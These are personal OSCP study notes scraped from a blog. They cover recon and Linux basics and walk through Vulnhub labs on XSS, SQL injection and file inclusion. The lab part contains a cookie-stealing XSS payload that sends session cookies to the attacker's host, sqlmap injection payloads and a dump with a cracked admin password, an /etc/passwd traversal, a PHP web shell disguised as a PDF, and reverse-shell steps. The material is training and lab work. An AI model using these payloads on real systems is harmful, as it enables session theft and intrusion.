<h3 id="Forward-Lookup-bruteforce"><a href="#Forward-Lookup-bruteforce" class="headerlink" title="Forward Lookup bruteforce"></a>Forward Lookup bruteforce</h3><h3 id="Reverse-lookup-bruteforce"><a href="#Reverse-lookup-bruteforce" class="headerlink" title="Reverse lookup bruteforce"></a>Reverse lookup bruteforce</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for ip in $(seq 50 100); do host x.x.x.$ip; done | grep -v &quot;not found&quot;</span><br></pre></td></tr></table></figure>

<h3 id="DNS-ZONETRANSFER"><a href="#DNS-ZONETRANSFER" class="headerlink" title="DNS ZONETRANSFER"></a>DNS ZONETRANSFER</h3><p><code>host -l</code><br><code>dnsrecon -d domain -D ~/list -t brt</code>  </p>
<h1 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h1><p><code>nc -nvv -w 1 -z 10.11.1.220 3388-3390</code><br>-w option specifies the connection timeout in seconds and -z is used to specify zero-I/O mode<br><code>nc -nv -u -z -w 1 10.11.1.115 160-162</code>  -u udp  </p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>-sT connection<br>-sU udp scan<br>-sS stealth/SYN scan  </p>
<h3 id="network-sweeping"><a href="#network-sweeping" class="headerlink" title="network sweeping"></a>network sweeping</h3><p><code>nmap -sn 10.11.1.1-254</code> -sn: Ping Scan - disable port scan<br><code>nmap -p 80 10.11.1.1-254 -oG web-sweep.txt</code><br><code>nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt</code>  </p>
<p>top ports determined here: <code>/usr/share/nmap/nmap-services</code> </p>
<p>-O OS fingerprint scan<br>-sV determine service and version info  </p>
<h3 id="Nmap-scripting-engine-NSE"><a href="#Nmap-scripting-engine-NSE" class="headerlink" title="Nmap scripting engine (NSE)"></a>Nmap scripting engine (NSE)</h3><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><p>sudo apt install masscan</p>
<h1 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h1><p>port 139, 445<br><code>nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227</code><br><code>nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254</code><br><code>sudo nbtscan -r 10.11.1.0/24</code>  </p>
<h1 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h1><p>rpc-bind 107 </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/13/Study-Notes-2021-03-13/">Study Notes - 2021/03/13</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><p>Some reviews: </p>
<h1 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h1><p>/bin/<br>/sbin/  system programs<br>/etc/   files<br>/tmp/ temporay file delete on boot<br>/usr/bin/  user binary<br>/usr/share application support files  </p>
<h2 id="Linux-Commands"><a href="#Linux-Commands" class="headerlink" title="Linux Commands:"></a>Linux Commands:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">man -k passwd:  key word search</span><br><span class="line">└─$ man -k &#39;^passwd$&#39;  </span><br><span class="line">passwd (1)           - change user password</span><br><span class="line">passwd (1ssl)        - compute password hashes</span><br><span class="line">passwd (5)           - the password file</span><br><span class="line">man 5 passwd</span><br></pre></td></tr></table></figure>

<p>apropos == man -k  </p>
<p>ls -a1<br>-1 means one file each line<br>cd, mkdir, pwd<br>with space:<br>cd module\ one/<br>mkdir -p /hello/world/{recon, exploit, report}  </p>
<h3 id="Finding-files-in-kali-linux"><a href="#Finding-files-in-kali-linux" class="headerlink" title="Finding files in kali linux"></a>Finding files in kali linux</h3><p>find, locate, which  </p>
<p><code>locate</code> seach a built in database instead of harddisk, can be update manually. <code>sudo updatedb</code>  </p>
<p>find can search size, type….</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find &#x2F; -name sbd*</span><br></pre></td></tr></table></figure>

<h2 id="manage-linux-services"><a href="#manage-linux-services" class="headerlink" title="manage linux services"></a>manage linux services</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start ssh</span><br><span class="line">sudo ss -antlp | grep sshd</span><br><span class="line">ss  is  used to dump socket statistics.</span><br></pre></td></tr></table></figure>
<p>-a all<br>-n numerical<br>-t tcp<br>-l listening<br>-p display process  </p>
<h3 id="list-all-available-services"><a href="#list-all-available-services" class="headerlink" title="list all available services:"></a>list all available services:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure>

<h2 id="Search-install-remove-tools"><a href="#Search-install-remove-tools" class="headerlink" title="Search/install/remove tools"></a>Search/install/remove tools</h2><p>sudo apt update<br>sudo apt upgrade &lt;package-name&gt;</p>
<p>apt-cache search pure-ftpd     search if package exist, search in package description<br>apt show &lt;pacage-name&gt;  show the description<br>apt install &lt;package-name&gt;<br>apt remove –purge  completely remove the package including user configurations  </p>
<p>sudo dpkg -i &lt;path to the package file.deb&gt;      will not install any dependency   </p>
<h1 id="Commandline"><a href="#Commandline" class="headerlink" title="Commandline"></a>Commandline</h1><h2 id="Some-environment-variables"><a href="#Some-environment-variables" class="headerlink" title="Some environment variables:"></a>Some environment variables:</h2><p>$PATH, $USER, $PWD, $HOME</p>
<h3 id="define-EV"><a href="#define-EV" class="headerlink" title="define EV:"></a>define EV:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export b&#x3D;10.11.1.220</span><br><span class="line">ping -c 2 $b</span><br></pre></td></tr></table></figure>
<p>without export, only affect current bash, not inherit by spawning bash  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env</span><br></pre></td></tr></table></figure>

<h2 id="Bash-history"><a href="#Bash-history" class="headerlink" title="Bash history"></a>Bash history</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">history</span><br><span class="line">!32   # replay line 32</span><br><span class="line">!!    # repeat the last command</span><br></pre></td></tr></table></figure>
<p>saved in <code>~/.bash_history</code><br><code>$HISTSIZE</code>,  <code>$HISTFILESIZE</code><br><code>CTRL+R</code> reverse-i-search  looking for most recent matched command  </p>
<h2 id="Pipline-and-redirection"><a href="#Pipline-and-redirection" class="headerlink" title="Pipline and redirection"></a>Pipline and redirection</h2><p>0 STDIN, 1 STDOUT, 2 STDERR  </p>
<p>Redirect to a new file:<br><code>echo &quot;test&quot; &gt; test.txt</code><br>Redirect to an existing file:<br><code>echo &quot;test&quot; &gt;&gt; test.txt</code><br>Redirect from a file:<br><code>wc -m &lt; test.text</code>  connect the file to the STDIN of wc<br>Redirect STDERR<br><code>ls ./test 2&gt;error.txt</code>  </p>
<h3 id="Piping"><a href="#Piping" class="headerlink" title="Piping"></a>Piping</h3><p><code>cat error.txt | wc -m</code>   output of cat to input of wc  </p>
<h2 id="Text-searching"><a href="#Text-searching" class="headerlink" title="Text searching"></a>Text searching</h2><p><code>ls -la /usr/bin | grep zip</code><br>-r recursive search<br>-i ignore case<br>sed:<br><code>echo &quot;I need to try hard&quot; | sed &#39;s/hard/harder/&#39;</code><br>cut:<br><code>echo &quot;hello, world, ???&quot; | cut -f 2 -d &quot;,&quot;</code><br>-f field<br>-d delimiter<br><strong>can only acce[t single char delimiter</strong><br><code>echo &quot;hello::there::friend&quot; | awk -F &quot;::&quot; &#39;&#123;print $1, $3&#125;&#39;</code><br>-F field separator  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat access.log | cut -d &quot; &quot; -f 1 | sort -u</span><br><span class="line">cat access.log | cut -d &quot; &quot; -f 1 | sort | uniq -c | sort -urn</span><br></pre></td></tr></table></figure>

<p>-n compare according to string numerical value<br>-r reverse the result of comparisons  </p>
<h1 id="Nano"><a href="#Nano" class="headerlink" title="Nano"></a>Nano</h1><p><code>Ctrl + K</code> cut the line<br><code>Ctrl + U</code> paste the line<br><code>Ctrl + W</code> search in the file  </p>
<h1 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h1><p><code>dd</code> delete current line<br><code>yy</code> copy the current line<br><code>p</code> to paste the clipboard content<br><code>x</code> delete the char under the current cursor  </p>
<h1 id="File-comparison"><a href="#File-comparison" class="headerlink" title="File comparison"></a>File comparison</h1><p><code>comm file1 file2</code>  unique line in file1. file2, and in both file<br><code>comm -12 file1 file2</code>  supress col1,2, only display lines in both files<br><code>diff -c/-u</code><br><code>vimdiff</code>  <code>Ctrl + W + arrow</code> switch window<br><code>[/] + c</code> jump to prev/next change<br><code>d+o</code> get the change in other window and put to the current one<br><code>d+p</code> put the change in current window and put to the other one   </p>
<h1 id="Manage-processes"><a href="#Manage-processes" class="headerlink" title="Manage processes"></a>Manage processes</h1><h2 id="background-process"><a href="#background-process" class="headerlink" title="background process"></a>background process</h2><p><code>Ctrl + Z</code> to suspend it, then resume it using <code>bg</code>  </p>
<p><code>jobs</code> shows the jobs in the current terminal<br><code>fg %[jobnum]</code> return the job to the foreground  </p>
<p><code>ps -ef</code><br> -e, –everyone  show processes of all users<br> -f, –full      show process uids, ppids  </p>
<h1 id="File-and-Command-Monitoring"><a href="#File-and-Command-Monitoring" class="headerlink" title="File and Command Monitoring"></a>File and Command Monitoring</h1><p> <code>tail and watch</code><br> <code>watch</code>  run command every 2 second<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">watch -n 5 w</span><br></pre></td></tr></table></figure><br>w - Show who is logged on and what they are doing.<br>-n   every 5 seconds  </p>
<h1 id="Download-Files"><a href="#Download-Files" class="headerlink" title="Download Files:"></a>Download Files:</h1><p><code>wget -O [dest] [url]</code><br><code>curl -o [dest] [url]</code><br><code>axwl -a -n 50 -o [dest] [url]</code><br>-n number of connections use<br>-a      Alternate progress indicator  </p>
<h1 id="Bash-environment"><a href="#Bash-environment" class="headerlink" title="Bash environment"></a>Bash environment</h1><p><code>export HISTCONTROL=ignoredups</code></p>
<p>System bash <code>/etc/bash.bashrc</code>  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/12/OSCP-Study-Notes-2021-03-12/">OSCP Study Notes - 2021/03/12</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/OSCP/">OSCP</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><p>Vulnhub Box: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/">XSS &amp; MySQL FILE</a></p>
<h1 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h1><p>Find the IP address using netdiscover: <code>192.168.119.134</code></p>
<p>Test by add to box</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;helloxss&quot;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>Create a php script:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;test&quot;</span>]) ?<span class="variable">$_GET</span>[<span class="string">&quot;test&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Start a php server:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 stop</span><br><span class="line">php -S 192.168.119.132:80</span><br><span class="line"># -S &lt;addr&gt;:&lt;port&gt; Run with built-in web server.</span><br></pre></td></tr></table></figure>

<p>Inject javascript to comment box:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>Then get a bounch of cookies:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Fri Mar 12 14:06:59 2021] 192.168.119.134:37106 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;h576adtob2huvem6m28ndk6lm5</span><br><span class="line">[Fri Mar 12 14:06:59 2021] 192.168.119.134:37106 Closing</span><br><span class="line">[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 Accepted</span><br><span class="line">[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;k0u7iarj89i203m84udm5ve7r5</span><br><span class="line">[Fri Mar 12 14:08:00 2021] 192.168.119.134:37110 Closing</span><br><span class="line">[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 Accepted</span><br><span class="line">[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;ioephhq6n3efntimq0nb2hfv26</span><br><span class="line">[Fri Mar 12 14:08:59 2021] 192.168.119.134:37114 Closing</span><br><span class="line">[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 Accepted</span><br><span class="line">[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;56lch59vt5c10o40lutelou564</span><br><span class="line">[Fri Mar 12 14:09:59 2021] 192.168.119.134:37118 Closing</span><br><span class="line">[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 Accepted</span><br><span class="line">[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 [200]: GET &#x2F;index.php?test&#x3D;PHPSESSID&#x3D;tal24ib05acs49vaf2i39r6jh7</span><br><span class="line">[Fri Mar 12 14:10:59 2021] 192.168.119.134:37122 Closing</span><br><span class="line">[Fri Mar 12 14:11:59 2021] 192.168.119.134:37126 Accepted</span><br></pre></td></tr></table></figure>

<p>Download Cookie_manager_plus plugin<br>add the cookie, refresh and open click the admin  </p>
<p>Login as admin !!</p>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>Go to the login page  </p>
<p>Check the Sql injection cheat sheet, search Pentest lab sql injection cheat sheet<br><a target="_blank" rel="noopener" href="https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/">https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/</a>  </p>
<h2 id="Potential-Sql-injection-position"><a href="#Potential-Sql-injection-position" class="headerlink" title="Potential Sql injection position:"></a>Potential Sql injection position:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.119.134&#x2F;post.php?id&#x3D;3</span><br></pre></td></tr></table></figure>
<p><code>?id=3</code></p>
<h2 id="Lets-try-sqlmap-first"><a href="#Lets-try-sqlmap-first" class="headerlink" title="Lets try sqlmap first"></a>Lets try sqlmap first</h2><p><strong>not allowed in the exam</strong>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.119.134&#x2F;post.php?id&#x3D;1&quot;</span><br><span class="line">[15:04:32] [WARNING] GET parameter &#39;id&#39; does not seem to be injectable</span><br></pre></td></tr></table></figure>

<p>or </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.119.134&#x2F;admin&#x2F;edit.php?id&#x3D;1&quot; --cookie&#x3D;PHPSESSID&#x3D;79fi4mj2s3lq39p0fmdmnpdpd1</span><br></pre></td></tr></table></figure>
<p>if know the cookie</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1 AND 7510&#x3D;7510</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 5982 FROM (SELECT(SLEEP(5)))lOqF)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: id&#x3D;-9410 UNION ALL SELECT NULL,NULL,CONCAT(0x7171706a71,0x716c664c74636976635573484b575956527471614e56527a524b527a4a76687a4a78454267716675,0x7171787871),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>Dump the databse:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.119.134&#x2F;admin&#x2F;edit.php?id&#x3D;1&quot; --cookie&#x3D;PHPSESSID&#x3D;79fi4mj2s3lq39p0fmdmnpdpd1 --dump</span><br><span class="line">[15:24:33] [INFO] cracked password &#39;P4ssw0rd&#39; for user &#39;admin&#39;                                                      </span><br><span class="line">Database: blog                                                                                                      </span><br><span class="line">Table: users</span><br><span class="line">[1 entry]</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line">| id | login | password                                    |</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line">| 1  | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |</span><br><span class="line">+----+-------+---------------------------------------------+</span><br><span class="line"></span><br><span class="line">+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+</span><br><span class="line">| id | post_id | text                                                                                             | title   | author  | published |</span><br><span class="line">+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+</span><br><span class="line">| 1  | 2       | &lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;                                                                    | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">| 2  | 2       |         &lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt; | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">| 3  | 3       |         rt                                                                                       | df      | df      | NULL      |</span><br><span class="line">| 4  | 3       |         &lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt; | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">| 5  | 1       |         &lt;script&gt;location.href&#x3D;&#39;http:&#x2F;&#x2F;192.168.119.132&#x2F;index.php?test&#x3D;&#39;+document.cookie;&lt;&#x2F;script&gt; | &lt;blank&gt; | &lt;blank&gt; | NULL      |</span><br><span class="line">+----+---------+--------------------------------------------------------------------------------------------------+---------+---------+-----------+</span><br></pre></td></tr></table></figure>
<p>try login page:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.119.134&#x2F;admin&#x2F;login.php&quot; --data&#x3D;&quot;user&#x3D;hello&amp;password&#x3D;23c&quot;</span><br></pre></td></tr></table></figure>


<h1 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h1><p>Vulhunb: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/">https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/</a></p>
<p>Use nikto:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.119.135</span><br><span class="line"></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.119.135</span><br><span class="line">+ Target Hostname:    192.168.119.135</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2021-03-12 20:47:51 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.2.16 (Debian)</span><br><span class="line">+ Retrieved x-powered-by header: PHP&#x2F;5.3.2</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Apache&#x2F;2.2.16 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to &#x2F;images over HTTP&#x2F;1.0. The value is &quot;127.0.0.1&quot;.</span><br><span class="line">+ Uncommon header &#39;tcn&#39; found, with contents: list</span><br><span class="line">+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http:&#x2F;&#x2F;www.wisec.it&#x2F;sectou.php?id&#x3D;4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.php</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ &#x2F;index.php: PHP include error may indicate local or remote file inclusion is possible.</span><br><span class="line">+ OSVDB-3126: &#x2F;submit?setoption&#x3D;q&amp;option&#x3D;allowed_ips&amp;value&#x3D;255.255.255.255: MLdonkey 2.x allows administrative interface access to be access from any IP. This is typically only found on port 4080.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3268: &#x2F;css&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;css&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3268: &#x2F;images&#x2F;: Directory indexing found.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file &#x2F;icons&#x2F;README, inode: 3472, size: 5108, mtime: Tue Aug 28 06:48:10 2007</span><br><span class="line">+ OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</span><br><span class="line">+ &#x2F;login.php: Admin login page&#x2F;section found.</span><br><span class="line">+ 8725 requests: 0 error(s) and 23 item(s) reported on remote host</span><br><span class="line">+ End Time:           2021-03-12 20:48:20 (GMT-5) (29 seconds)</span><br></pre></td></tr></table></figure>
<p>but found</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.13(5&#x2F;index.php?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br></pre></td></tr></table></figure>
<p>not be able to scan anything, </p>
<p>Create a pdf file</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    system(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>the file goes to upload folder <strong>how to know that?</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.135&#x2F;index.php?page&#x3D;uploads&#x2F;shell.pdf%00&amp;cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
<p>%00 tell php ignore following content</p>
<h3 id="php-reverse-shell"><a href="#php-reverse-shell" class="headerlink" title="php reverse shell"></a>php reverse shell</h3><p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a>  </p>
<p>add <code>%PDF-1.4</code> to make it looks like a pdf file<br>modify ip and port in the script  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>get the shell now<br>next step: privielege escalation<br>find a folder you have full control  </p>
<h1 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h1><p>create malicious payload</p>
